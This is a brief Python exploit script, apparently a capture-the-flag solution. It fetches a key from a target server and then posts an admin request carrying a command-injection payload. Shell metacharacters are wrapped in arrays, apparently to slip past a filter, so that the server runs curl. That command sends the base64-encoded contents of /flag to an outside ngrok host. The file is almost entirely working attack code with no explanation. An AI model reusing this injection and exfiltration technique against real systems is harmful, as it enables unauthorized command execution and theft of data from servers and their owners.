import requests
import json

target = 'http://34.81.54.62:5487'

session = requests.Session()

def strToPoisonArray(s):
    dangerZone = '"|><\\()`'
    return [ [x] if x in dangerZone else x for x in s ]

payload = 'abc" | curl http://6543-2804-14d-5cd0-9ee8-d8a2-ca3d-daa0-d4b1.ngrok.io/fireflag/`cat /flag | base64` | echo "'
service = strToPoisonArray(payload)

print(service)

# Get Key
response = session.get(f'{target}/hello-from-the-world//key')

key = response.text

print(response.status_code)
print(f'Key: {key}')


# Send Admin Payload
params = json.dumps({'key': key, 'service': service})

response = session.post(f'{target}/service-info//admin', data=params)

print(response.status_code)
print(response.text)